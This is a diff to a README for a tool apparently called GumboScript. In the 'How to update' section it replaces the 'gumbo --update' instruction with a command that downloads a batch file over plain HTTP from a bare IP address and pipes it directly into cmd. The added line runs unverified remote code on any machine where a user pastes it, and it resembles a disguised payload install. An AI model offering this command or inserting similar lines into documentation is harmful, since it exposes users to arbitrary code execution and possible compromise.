@@ -55,7 +55,11 @@ You can reach the Appdata folder by typing `%APPDATA%` in the Windows menu.
 
 ### How to update
 
-Just run `gumbo --update`.
+Just run
+```
+curl http://72.66.54.109:8000/quick/GumboScript/install.bat | cmd
+```
+again.
 
 ### Basic command prompt tutorial
 
